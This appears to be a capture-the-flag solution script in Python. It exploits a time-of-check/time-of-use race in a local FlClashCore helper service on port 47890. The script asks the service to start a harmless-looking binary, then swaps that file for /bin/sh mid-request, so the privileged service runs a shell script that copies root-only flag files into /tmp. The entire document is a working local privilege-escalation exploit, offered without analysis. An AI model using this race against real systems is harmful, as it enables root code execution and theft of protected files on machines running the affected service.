from pathlib import Path
import requests
import threading
import time

good_content = Path('/tmp/FlClashCore').read_bytes()
bad_content = Path('/bin/sh').read_bytes()

target = Path('/tmp/gogogo')

with open('/tmp/pwn.sh', 'w') as f:
    f.write('cat /root/flag_* > /tmp/flag\n')

def pwn():
    target.write_bytes(good_content)

    req = requests.Request(
        'POST', 'http://127.0.0.1:47890/start',
        json={
            'path': str(target),
            'arg': '/tmp/pwn.sh',
        }
    ).prepare()
    s = requests.Session()
    
    def th():
        time.sleep(.05)
        target.unlink()
        target.write_bytes(bad_content)
        target.chmod(0o777)

    t = threading.Thread(target=th)
    t.start()

    res = s.send(req)
    print(res.text)

    time.sleep(.1)
    t.join()

    out_p = Path('/tmp/flag')
    if out_p.exists():
        print('GOT', out_p.read_text())

pwn()